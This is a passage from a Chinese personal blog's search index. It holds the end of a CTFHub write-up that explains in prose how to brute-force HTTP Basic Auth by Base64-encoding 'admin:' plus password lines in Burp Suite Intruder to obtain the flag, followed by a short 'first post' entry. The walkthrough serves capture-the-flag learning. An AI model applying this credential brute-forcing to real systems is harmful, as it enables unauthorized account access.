Suite抓包，看到用户名和密码都被执行Base64编码后才传到服务器</li><li>抓的数据包发送到Repeater，看到响应头有提示用户名为admin</li><li>写脚本或者用Notepad++等其它软件在每行密码前添加”admin:”</li><li>抓的数据包发送到Intruder，然后对被Base64编码的地方添加一个payload</li><li>把密码文件载入到载荷中，进行base64编码后进行爆破攻击，得到正确的用户名和密码，拿到flag</li></ol></div><hr><blockquote><p>PS：好像正确的用户名密码不是固定的，记得自己手动做一下！</p><p>没想到第一条正经博客居然写那么啰嗦…</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> CTFHub </category>
          
      </categories>
      
      
        <tags>
            
            <tag> http </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>我的第一篇文章</title>
      <link href="/2021/09/25/onepost/"/>
      <url>/2021/09/25/onepost/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><hr><h1 id="我的第一篇文章！"><a href="#我的第一篇文章！" class="headerlink" title="我的第一篇文章！"></a>我的第一篇文章！</h1><p>其实我也不知道要讲什么，就先这样吧！</p><p>开启我的Blog生涯！</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202109251640402.jpg"></p>]]></content>
      
      
      <categories>
          
          <category> life </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 生活 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
